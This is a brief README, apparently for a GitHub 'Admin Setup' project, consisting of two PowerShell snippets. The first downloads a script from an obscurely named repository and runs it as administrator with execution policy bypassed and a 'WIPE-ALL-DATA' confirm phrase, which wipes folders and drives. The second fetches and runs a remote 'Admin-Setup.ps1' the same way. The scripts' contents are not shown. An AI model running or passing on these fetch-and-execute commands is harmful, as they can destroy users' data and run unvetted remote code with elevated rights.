# Admin Setup

Clear folders (Downloads + other drives), keep only Windows OS folders:

```powershell
$c = "$env:USERPROFILE\admin\Clear-All-Except-Windows.ps1"
New-Item -ItemType Directory -Force -Path (Split-Path $c) | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-All-Except-Windows.ps1 -OutFile $c
Start-Process "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$c`" -ConfirmPhrase WIPE-ALL-DATA"
```

Full setup script:

```powershell
$dst = "$env:USERPROFILE\admin\Admin-Setup.ps1"
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile $dst
powershell -STA -NoProfile -ExecutionPolicy Bypass -File $dst
```
